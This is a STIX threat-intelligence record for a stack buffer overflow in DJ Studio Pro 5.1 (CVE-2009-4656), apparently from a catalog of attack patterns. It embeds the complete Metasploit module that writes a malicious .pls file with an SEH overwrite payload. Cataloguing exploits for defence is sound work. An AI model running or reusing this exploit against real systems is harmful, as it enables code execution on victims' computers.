{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d565cc3a-11a1-480d-896d-59c8e3ae78d1",
    "created": "2024-08-14T16:36:46.853664Z",
    "modified": "2024-08-14T16:36:46.853668Z",
    "name": "DJ Studio Pro 5.1 .pls Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in DJ Studio Pro 5.1.6.5.2. When handling a .pls file, DJ Studio will copy the user-supplied data on the stack without any proper bounds checking done beforehand, therefore allowing code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/djstudio_pls_bof.rb",
            "external_id": "djstudio_pls_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4656"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DJ Studio Pro 5.1 .pls Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in DJ Studio Pro 5.1.6.5.2.\n        When handling a .pls file, DJ Studio will copy the user-supplied data on the stack\n        without any proper bounds checking done beforehand, therefore allowing code\n        execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Sebastien Duquette',\n          'Death-Shadow-Dark <death.shadow.dark[at]gmail.com>',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4656'],\n          [ 'OSVDB', '58159'],\n          [ 'EDB', '10827' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 5000,\n          'BadChars' => \"\\x00\\x0a\\x3d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # POP EBX # POP ECX # RET 8\n          # DJStudioPro.exe\n          [ 'DJ Studio Pro 5.1.6.5.2', { 'Ret' => 0x014FC62D } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-12-30',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),\n        ])\n\n  end\n\n  def exploit\n\n    sploit = rand_text_alpha_upper(1308)\n    sploit << generate_seh_payload(target.ret)\n    sploit << rand_text_alpha_upper(10000)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-30",
    "x_mitre_platforms": [
        "win'"
    ]
}